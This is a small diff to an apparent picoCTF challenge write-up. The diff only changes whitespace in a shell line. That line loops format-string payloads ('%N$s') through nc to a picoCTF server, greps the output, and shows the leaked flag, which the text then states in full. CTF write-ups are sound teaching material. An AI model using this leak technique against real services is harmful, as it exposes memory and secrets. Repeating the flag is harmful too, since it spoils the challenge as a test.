@@ -61,7 +61,7 @@ pico: Matches any occurrence of "pico" (case-insensitively).
 ctf: Matches any occurrence of "ctf" (case-insensitively).
 
 ```bash 
-randoduck@DESKTOP-2PM3SNS:~$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 59213 | grep -Ei '(pico|ctf)'; done                                                                                                                                            CTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}     
+randoduck@DESKTOP-2PM3SNS:~$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 59213 | grep -Ei '(pico|ctf)'; done              CTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}     
 ```
 piecing it up we get the flag as : *picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}*
 
